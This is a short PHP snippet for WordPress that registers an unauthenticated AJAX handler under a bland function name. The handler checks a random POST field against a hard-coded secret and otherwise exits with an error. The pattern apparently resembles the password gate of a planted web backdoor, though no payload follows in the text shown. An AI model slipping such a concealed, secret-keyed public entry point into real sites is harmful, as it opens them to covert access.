<?php

function polyfill_headers_include() {
	if (!isset($_POST["aawbkclnv"]) || $_POST["aawbkclnv"] !== "xkxzLbsjFgVIWzq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'polyfill_headers_include', 5, 1);
